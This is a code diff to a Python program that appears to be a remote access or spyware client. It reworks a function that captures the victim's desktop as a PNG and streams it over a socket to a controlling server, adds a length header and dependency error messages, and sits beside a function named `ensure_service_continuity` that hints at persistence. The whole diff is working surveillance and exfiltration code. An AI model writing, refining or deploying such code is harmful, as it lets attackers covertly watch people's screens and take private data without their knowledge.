@@ -215,15 +215,16 @@ def capture_desktop_screenshot(client: socket.socket) -> None:
             image.save(png_buffer, format='PNG')
             png_data = png_buffer.getvalue()
             
-            # Send PNG data to server
-            message = json.dumps({'type': 'desktop_screenshot', 'size': len(png_data)})
-            client.send(f"DESKTOP_SIZE {len(png_data)}\n".encode())
-            client.sendall(png_data)
+            # Send PNG data with explicit header
+            header = f"START_IMG|SIZE|{len(png_data)}\n".encode('utf-8')
+            client.sendall(header + png_data)
             print(f"[+] Desktop screenshot captured and sent ({len(png_data)} bytes)")
     except Exception as e:
-        error_msg = json.dumps({'error': str(e)})
-        client.send(f"DESKTOP_SIZE {len(error_msg)}\n".encode())
-        client.sendall(error_msg.encode())
+        error_msg = f"DEPENDENCY_MISSING: mss Pillow\n" if not MSS_AVAILABLE or not PIL_AVAILABLE else str(e)
+        try:
+            client.sendall(error_msg.encode('utf-8'))
+        except Exception:
+            pass
         print(f"[-] Desktop capture failed: {e}")
 
 def ensure_service_continuity() -> None:
